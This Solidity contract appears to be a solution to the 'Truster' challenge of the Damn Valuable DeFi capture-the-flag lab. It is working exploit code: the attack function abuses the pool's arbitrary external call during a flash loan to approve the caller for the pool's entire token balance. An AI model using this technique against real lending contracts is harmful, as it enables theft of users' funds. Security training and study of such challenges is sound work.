pragma solidity >=0.8.0;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract AttackTruster {
    function attack(address _dvt, address _lenderPool) external {
        TrusterLenderPool trusterLenderPool = TrusterLenderPool(_lenderPool);
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        trusterLenderPool.flashLoan(
            1,
            address(this),
            _dvt,
            abi.encodeWithSelector(dvt.approve.selector, msg.sender, dvt.balanceOf(address(trusterLenderPool)))
        );
    }
}
